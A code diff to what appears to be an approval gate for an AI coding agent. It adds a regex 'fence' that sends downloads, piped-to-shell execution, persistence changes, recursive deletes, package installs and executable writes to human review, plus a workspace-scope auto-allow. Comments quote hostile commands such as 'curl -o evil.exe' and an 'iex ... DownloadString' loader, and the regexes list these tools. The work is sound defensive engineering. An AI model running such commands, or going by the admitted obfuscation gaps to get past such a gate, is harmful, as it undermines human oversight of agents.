@@ -36,7 +36,7 @@ import { join, dirname } from 'node:path'
 import { fileURLToPath } from 'node:url'
 // 吸收自 NanmiCoder/dsh-auto-mode（MIT）：判定输入脱敏 / 路径事实硬拒 / 结构化裁决协议
 import { sanitizeClassifierText, sanitizeClassifierArguments } from './sanitize.mjs'
-import { resolveRoots, hardDestructiveTargetReason, containsCredentialMaterial, urlContainsCredential, extractAbsolutePaths, classifyPathScope, hasPathTraversal } from './paths.mjs'
+import { resolveRoots, hardDestructiveTargetReason, containsCredentialMaterial, urlContainsCredential, extractAbsolutePaths, classifyPathScope, hasPathTraversal, isWithin } from './paths.mjs'
 import { parseClassifierText, buildClassifierPayload, CLASSIFIER_SYSTEM_PROMPT } from './classifier.mjs'
 // 审批说明中文化：面向审批人的说明一律中文（命令/路径原样保留）
 import { buildChineseReason, describeFacts, compactFacts } from './zh.mjs'
@@ -694,6 +694,133 @@ export function hardDenyFacts(toolName, args, roots) {
   return { tier: 'human', reason: why }
 }
 
+// ---- 危险动作围栏（用户 2026-10-04 决策：定域放行之上再加一层否决） ----
+/**
+ * 围栏要解决的矛盾：用户要「工作区内按定域放行」，同时要「模型被诱导下载恶意脚本 / exe
+ * 必须审批」。两者冲突的场景是真实存在的 ——
+ * `curl -o evil.exe http://x/y`、`iwr http://x/y.ps1 -OutFile evil.ps1`、
+ * `python -c "open('x.exe','wb').write(...)"` 的目标**全部在工作区内**，纯定域规则会直接放行。
+ *
+ * 因此围栏是定域放行之上的**否决层**，且排在白名单与学习之前：
+ * 已沉淀的宽规则（如 `contains:"git"` / `contains:"github"`）也盖不过它 ——
+ * 否则一次追认就能把「下载」永久放行。命中即转人工，**不学习、不可追认**。
+ *
+ * 诚实交代：围栏是**文本特征**匹配，能被刻意混淆绕过（base64、变量拼接、二次下载）。
+ * 它挡的是「模型被诱导」这类非对抗性失败，不是定向攻击。真正的边界仍然是沙箱与人工。
+ */
+
+/** 网络取物：下载器出现即拦。豁免：命令里的 URL 全部指向本机（本地健康检查不是取物） */
+const FENCE_NET_RE = /\b(?:curl|wget|aria2c|bitsadmin)\b|invoke-webrequest|invoke-restmethod|\biwr\b|\birm\b|start-bitstransfer|certutil\b[^\n]*-urlcache|downloadstring|downloadfile|downloaddata|gh\s+release\s+download/
+const FENCE_LOCAL_URL_RE = /^[a-z]+:\/\/(?:localhost|127\.0\.0\.1|\[?::1\]?|0\.0\.0\.0)(?::\d+)?(?:[/?#]|$)/i
+
+/** 动态执行 / 混淆：`curl x | bash`、`iex (New-Object Net.WebClient).DownloadString(...)`、`-EncodedCommand` */
+const FENCE_EXEC_RE = /invoke-expression|\biex\b|iex\(|-encodedcommand|frombase64string|certutil\b[^\n]*-decode|\|\s*(?:bash|sh|zsh|pwsh|powershell|cmd|iex)\b/
+
+/** 依赖安装：包管理器会在工作区里执行 registry 下发的安装脚本（供应链入口）。
+ *  豁免：命令指向 `$DSH_HOME`（profile / 插件依赖）—— 那一档按用户决策本就自动放行。 */
+const FENCE_PKG_RE = /\b(?:npm|pnpm|yarn|bun)\s+(?:i|install|add|dlx|exec)\b|\bpip3?\s+install\b|\bcargo\s+install\b|\bgo\s+install\b|\bwinget\s+install\b|\bchoco\s+install\b|\bscoop\s+install\b|\bdocker\s+pull\b/
+
+/** 持久化 / 系统状态改写动词 */
+const FENCE_PERSIST_RE = /\bschtasks\b|\breg\s+add\b|new-service|\bsc\s+create\b|core\.hookspath|set-executionpolicy|netsh\s+advfirewall|add-mppreference|set-mppreference|\bbcdedit\b|\bwmic\b|\btakeown\b|\bicacls\b/
+
+/**
+ * 递归删除。单文件清理（本次会话产出的临时文件，如推送后删掉 `_commit-msg.txt`）是日常动作，
+ * 30 天实测 36 次，全拦会把人工提示从 147 抬到 180 —— 只拦递归/强删这一档（实测 6 次/30 天）。
+ */
+const FENCE_DELETE_RE = /(?:remove-item|rm|rmdir|rd|del|erase)\b[^;|&\n]{0,200}?(?:-recurse|--recursive|\/s\b|\s-r[a-z]*\b)|\brmtree\b|\bshutil\.rmtree\b|\bfs\.rm(?:sync)?\s*\([^)]*recursive|\bgit\s+clean\b|\bgit\s+reset\s+--hard\b/
+
+/** 可执行 / 脚本产物扩展名。`.sh`/`.py`/`.js` 刻意不在列：开发工作区天天产出，误报率过高；
+ *  「下载一个 .sh 再执行」由 FENCE_NET_RE + FENCE_EXEC_RE 覆盖。 */
+const FENCE_EXEC_EXT_RE = /\.(?:exe|dll|sys|scr|com|msi|msix|bat|cmd|ps1|psm1|vbs|vbe|jse|wsf|hta|lnk|reg|jar|apk|dmg|pkg|deb|rpm|iso|img|vhd|vhdx|node|so|dylib)$/i
+
+/** 落到「下次会被自动执行」的位置：git 钩子 / CI 工作流 / 启动目录 / Python 启动钩子 */
+const FENCE_PERSIST_PATH_RE = /(?:^|[\\/])\.git[\\/]hooks(?:[\\/]|$)|(?:^|[\\/])\.github[\\/]workflows(?:[\\/]|$)|(?:^|[\\/])startup(?:[\\/]|$)|(?:^|[\\/])sitecustomize\.py$/i
+
+/**
+ * 命令里的**落盘目标**。
+ *
+ * 只认这些位置，才能区分「写一个 exe/ps1」与「执行一个已存在的 ps1」：
+ * `pwsh -File .\build.ps1 *> .\tmp\x` 里 `build.ps1` 是被执行的脚本，不是本次产出的可执行文件。
+ * 只看 `files` 也不行 —— 命令类工具的 `files` 会退化成 justification 里的散文片段（实测假命中）。
+ */
+const FENCE_WRITE_DEST_RE = /(?:open\s*\(\s*r?['"]([^'"]+)['"]\s*,\s*['"][wa]b?['"]|(?:-outfile|-destinationpath|--output|-o\b|>>?|out-file|set-content|add-content|new-item\s+-path|\btee\b)\s*['"]?([^\s'";|)]+))/gi
+
+function fenceNormalize(text) {
+  return String(text || '').toLowerCase().replace(/[`^]/g, '').replace(/\s+/g, ' ')
+}
+
+/** 命令里的 URL 是否**全部**指向本机 */
+function fenceOnlyLocalUrls(text) {
+  const urls = String(text || '').match(/(?:https?|ftp):\/\/[^\s'"|;)]+/gi) || []
+  if (urls.length === 0) return false
+  return urls.every((u) => FENCE_LOCAL_URL_RE.test(u))
+}
+
+/** 命令里显式写向的路径（重定向 / -OutFile / open(...,'w') 等） */
+function fenceWriteDestinations(text) {
+  const out = []
+  const re = new RegExp(FENCE_WRITE_DEST_RE.source, 'gi')
+  let m
+  while ((m = re.exec(String(text || ''))) !== null) {
+    const hit = m[1] || m[2]
+    if (hit) out.push(hit)
+    if (out.length >= 24) break
+  }
+  return out
+}
+
+/** 命令是否指向 `$DSH_HOME`（DSH 配置档：profile / 插件依赖的安装不拦） */
+function fenceMentionsDshHome(text, roots) {
+  if (!roots || !roots.dshHome) return false
+  const home = String(roots.dshHome).replace(/\//g, '\\').toLowerCase()
+  const t = String(text || '').replace(/\//g, '\\').toLowerCase()
+  return t.includes(home)
+}
+
+/**
+ * 危险动作围栏判定。
+ *
+ * @param {string} toolName 工具名
+ * @param {object} args 本次调用的工具参数（command / file_path / …）
+ * @param {{writeTargets?: string[], roots?: object}} options writeTargets=结构化写目标（write/edit 的 file_path），roots=判定根
+ * @returns {string|undefined} 中文拦截原因；未命中返回 undefined
+ */
+export function fenceReason(toolName, args, options) {
+  const o = options || {}
+  const a = args && typeof args === 'object' ? args : {}
+  const rawCmd = a.command || a.cmd || a.script || ''
+  const text = fenceNormalize(rawCmd)
+
+  if (text) {
+    if (FENCE_NET_RE.test(text) && !fenceOnlyLocalUrls(rawCmd)) {
+      return '网络下载：命令调用了下载器，可能被诱导取回恶意脚本或可执行文件'
+    }
+    if (FENCE_EXEC_RE.test(text)) return '动态执行：命令把取回的内容直接交给解释器执行'
+    if (FENCE_PERSIST_RE.test(text)) return '持久化：命令改写了计划任务 / 服务 / 注册表 / 防火墙等系统状态'
+    if (FENCE_DELETE_RE.test(text)) return '递归删除：命令会递归删除目录，不可回滚'
+    if (FENCE_PKG_RE.test(text) && !fenceMentionsDshHome(rawCmd, o.roots)) {
+      return '依赖安装：包管理器会执行 registry 下发的安装脚本（供应链入口）'
+    }
+  }
+
+  // 可执行产物：**非命令工具**（write/edit）看结构化写目标；**命令类工具**只看命令里的落盘目标。
+  // 不能对命令类工具用它的「写目标」：resolveToolCallFiles 的写特征很宽（`*>` 重定向就算写），
+  // 于是 `pwsh -File .\build.ps1 *> .\tmp\x.log` 里的 .ps1 会被误判成「本次产出的可执行文件」。
+  const targets = []
+  if (text) {
+    for (const d of fenceWriteDestinations(rawCmd)) targets.push(d)
+  } else {
+    for (const t of (Array.isArray(o.writeTargets) ? o.writeTargets : [])) if (t) targets.push(String(t))
+  }
+  for (const t of targets) {
+    const clean = t.trim().replace(/['"]/g, '')
+    if (!clean) continue
+    if (FENCE_PERSIST_PATH_RE.test(clean)) return '自启动位置：写入了 git 钩子 / CI 工作流 / 启动目录等会被自动执行的位置'
+    if (FENCE_EXEC_EXT_RE.test(clean)) return '可执行产物：写入了 exe / dll / 脚本等可执行文件'
+  }
+  return undefined
+}
+
 /** 提示层指导文本（吸收自 dsh-auto-mode AUTO_MODE_AGENT_GUIDANCE，按本插件语义改写） */
 const AUTO_APPROVE_GUIDANCE = [
   '<auto_approve_policy>',
@@ -867,6 +994,7 @@ function getRulesSnapshot(permissionPresets) {
       judgeFailureLimit: config.judgeFailureLimit || 1,
       judgeMaxTokens: config.judgeMaxTokens || 1024,
       sedimentScope: sedimentScope(),
+      scopeAutoAllow: config.scopeAutoAllow !== false,
       learning: { enabled: learning.enabled !== false }
     },
     learning: {
@@ -990,6 +1118,15 @@ function applyRuleOp(op, kind, value) {
     saveJson(ALLOWLIST_PATH, config)
     audit(`CONFIG  sedimentScope → ${v}`)
     return { ok: true, set: true, value: v }
+  }
+
+  // 定域放行开关（布尔）：目标全部在工作区内即自动放行（用户 2026-10-04 决策）
+  if (kind === 'scopeAutoAllow') {
+    if (op !== 'set') return { ok: false, error: 'scopeAutoAllow 使用 set 操作' }
+    config.scopeAutoAllow = !(value === false || value === 'false')
+    saveJson(ALLOWLIST_PATH, config)
+    audit(`CONFIG  scopeAutoAllow → ${config.scopeAutoAllow}`)
+    return { ok: true, set: true, value: config.scopeAutoAllow }
   }
 
   // 把一条会话作用域的规则提升为全局（op=promote，kind=allowRules）
@@ -1221,6 +1358,9 @@ function normalizeConfig(raw) {
   cfg.judgeFailureLimit = cfg.judgeFailureLimit || 1
   // 判定调用输出上限：推理与正文共享 max_tokens，过小会让推理吃光额度、正文为空
   cfg.judgeMaxTokens = cfg.judgeMaxTokens || 1024
+  // 定域放行：目标全部落在工作区内即放行（用户 2026-10-04 决策：工作区内的增删改查风险可控）。
+  // 关闭后回到旧行为：工作区内的 danger-full-access 也要过判定器 / 人工。
+  cfg.scopeAutoAllow = cfg.scopeAutoAllow !== false
   cfg.learning = cfg.learning || { enabled: true }
   // 判定模型：先迁移旧字段（本机取值），再规范化
   migrateJudgeModel(cfg)
@@ -2550,7 +2690,28 @@ export default {
         // 审计据此回答「动的是工作区内还是外」，判定器据此看到真实路径事实。
         const toolTargets = resolveToolCallTargets(req.callId, events)
         const scopeText = [toolCmd, displayCmd.command, justification].filter(Boolean).join(' ')
-        const targetScope = targetScopeOf(toolTargets, roots, scopeText)
+        // 定域输入 = 命令/参数里的绝对路径目标 ∪ **解析后的写目标**。
+        // write/edit 通常给相对路径（`src/x.mjs`），不解析就永远是 unknown，
+        // 定域放行对最常见的写操作完全失效（unknown 一律不放行，fail-closed）。
+        const scopePaths = (toolTargets || []).slice()
+        for (const f of toolFiles || []) {
+          if (!f) continue
+          // 只补**相对**写目标：绝对写目标已由 resolveToolCallTargets 从参数里提取。
+          // 顺带避开 extractFiles 把 URL 路径段当 POSIX 绝对路径的老毛病
+          // （`http://example.com/evil.exe` → `/example.com/evil.exe`），
+          // 那会把一次纯工作区操作误判成「跨工作区内外」。
+          if (/^(?:[a-zA-Z]:[\\/]|\\\\|\/|~)/.test(String(f))) continue
+          let abs = ''
+          try { abs = resolveAbsPath(String(f), sessionCwd) } catch { abs = '' }
+          if (!abs || scopePaths.some((t) => t.path === abs)) continue
+          scopePaths.push({ raw: String(f), path: abs, kind: 'data' })
+        }
+        const targetScope = targetScopeOf(scopePaths, roots, scopeText)
+        // 本次调用的工具参数：硬拒层、围栏与判定器输入都要用，提前取一次
+        const callArgs = resolveToolCallArgs(req.callId, events) || {}
+        // 危险动作围栏：这里只**计算**（中文说明要把「为什么转人工」写进卡片），
+        // 裁决点在 DENY 层之后 —— 危险词永远最高优先。
+        const fenced = fenceReason(toolName, callArgs, { writeTargets: toolFiles, roots })
         // 结构化审批事实：中文说明（zh）与审查界面字段表格（facts）同源，
         // 命令与路径原样保留，只为「一眼看清改什么、动哪里、影响多大」。
         const factInput = {
@@ -2563,6 +2724,7 @@ export default {
           targets: (toolTargets || []).map((t) => t.raw),
           targetScope: targetScope.scope,
           targetTraversal: targetScope.traversal,
+          fence: fenced,
           cwd: sessionCwd
         }
         const zhReason = buildChineseReason(factInput)
@@ -2646,7 +2808,6 @@ export default {
 
         // ---- 0. 确定性硬拒层（吸收自 dsh-auto-mode：分类器无权推翻） ----
         // 事实来源：工具参数的真实路径 + 凭据材料正则，而非 justification 关键词。
-        const callArgs = resolveToolCallArgs(req.callId, events) || {}
         const hardFacts = hardDenyFacts(toolName, callArgs, roots)
         let dshConfigAllow = null
         if (hardFacts) {
@@ -2673,7 +2834,17 @@ export default {
           return forwardToHuman(sessionId, toolName, mode, reason, justification, '', 'deny')
         }
 
-        // 1b. DSH 配置档：$DSH_HOME 下的 profile / 插件 / 依赖改动自动放行
+        // 1b. 危险动作围栏：下载 / 动态执行 / 依赖安装 / 持久化 / 递归删除 / 可执行产物 → 转人工。
+        //     用户 2026-10-04 决策：「工作区内按定域放行，但下载恶意脚本、exe 必须触发审批」。
+        //     排在白名单与学习**之前**：已沉淀的宽规则（contains:"git"/"github"）也盖不过它，
+        //     否则一次追认就能把「下载」永久放行。命中即人工，且不学习、不可追认
+        //     （forwardToHuman 只在 why='flash-failed' 时沉淀规则）。
+        if (fenced) {
+          audit(`FENCE   ${toolName} mode=${mode || 'none'} | ${fenced}`)
+          return forwardToHuman(sessionId, toolName, mode, reason, justification, '', 'fence')
+        }
+
+        // 1c. DSH 配置档：$DSH_HOME 下的 profile / 插件 / 依赖改动自动放行
         //     （用户 2026-10-04 决策：这块风险可控；最近 7 天 36 次人工里 20 次是这类）
         //     例外（审批门自身数据目录、凭据类文件名）已在 hardDenyFacts 里转人工。
         if (dshConfigAllow) {
@@ -2697,6 +2868,18 @@ export default {
         if (matchedRule) {
           audit(`ALLOW   ${toolName} mode=${mode || 'none'} (rule: ${matchedRule.description || 'matched'})`)
           recordAutoAllow(sessionId, toolName, mode, reason, justification, 'rule', displayOpts)
+          return 'allowed-once'
+        }
+
+        // 2c. 定域放行：本次调用指向的路径**全部**落在工作区内 → 放行（用户 2026-10-04 决策）。
+        //     语义：工作区内的增删改查风险可控，不必每次人工；工作区外的读写仍要过判定器/人工。
+        //     fail-closed：unknown（提不出绝对路径 / 含 `..` 穿越）与 outside / mixed 一律不放行 ——
+        //     「没看见路径」不等于「在工作区内」。
+        //     排在围栏之后：下载、可执行产物、递归删除即使目标在区内也仍然人工。
+        //     排在规则之后：已有规则的归因与行为完全不变，本层只**新增**放行。
+        if (config.scopeAutoAllow !== false && targetScope.scope === 'inside') {
+          audit(`ALLOW   ${toolName} mode=${mode || 'none'} (scope: 目标全部在工作区内 ${targetScope.inside.length} 处)`)
+          recordAutoAllow(sessionId, toolName, mode, reason, justification, 'scope', displayOpts)
           return 'allowed-once'
         }
 
@@ -2968,6 +3151,6 @@ export default {
       }
     }, { prepend: true })
 
-    console.log(`[${NAME}] 已挂载：硬拒(凭据/系统路径)→硬事实人工→危险词→白名单→denyRules→判定(JSON allow/ask/deny，硬类别人工，中立计数${config.riskyThreshold}，失败上限${config.judgeFailureLimit})→裁决学习（配置: ${ALLOWLIST_PATH}）`)
+    console.log(`[${NAME}] 已挂载：硬拒(凭据/系统路径)→硬事实人工→危险词→围栏(下载/可执行/持久化/递归删除)→DSH配置放行→白名单→定域放行(${config.scopeAutoAllow === false ? '关' : '开'})→denyRules→判定(JSON allow/ask/deny，硬类别人工，中立计数${config.riskyThreshold}，失败上限${config.judgeFailureLimit})→裁决学习（配置: ${ALLOWLIST_PATH}）`)
   },
 }
